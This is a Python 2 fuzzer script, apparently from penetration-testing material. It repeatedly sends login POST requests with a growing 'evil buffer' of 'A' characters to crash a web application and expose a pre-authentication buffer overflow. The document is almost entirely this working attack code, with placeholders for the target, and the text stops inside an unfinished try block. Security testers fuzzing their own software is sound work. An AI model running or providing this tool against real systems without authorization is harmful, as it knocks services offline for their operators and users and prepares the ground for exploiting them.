# Python fuzzer to test for pre-authentication buffer overflow
# vulnerabilities in web application login functions.
# 
# This fuzzer, given a target IP/URL and port number, will loop
# an increasing buffer size and "log into" the application until
# the application crashes.  Commments added where necessary.
#
# Use this fuzzer in conjunction with a debugger to confirm the
# overflow actually exists instead of just crashing the program.

#!/usr/bin/python
import socket
import time
import sys

size = 100 # Byte size of the first buffer to send
while (size < 2000): # change maximum size as needed
	try:
		print "\nSending evil buffer with %s bytes" % size
		inputBuffer = "A" * size
		content = "username=" + inputBuffer + "&password=A"
		
		buffer = "POST /login HTTP/1.1\r\n"
		buffer += "Host: <TargetIP>\r\n" # Change the target IP/URL here
		buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
		buffer += "Accept: text/html,application/xhtml,application/xml;q=0.9,*/*;q=0.8\r\n"
		buffer += "Accept-Language: en-US,en;q=0.5\r\n"
		buffer += "Referer: http://<TargetIP>/login\r\n" # Change the target IP/URL here
		buffer += "Connection: close\r\n"
		buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
		buffer += "Content-Length: "+str(len(content))+"\r\n"
		buffer += "\r\n"
		buffer += content
		
		s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
		s.connect(("<TargetIP>", <Port>))
		s.send(buffer)
		s.close()
		size += 100 # Modify the per-loop incrementation of the buffer size if required
		time.sleep(10) # Optional, used to throttle the fuzzer or remove entirely
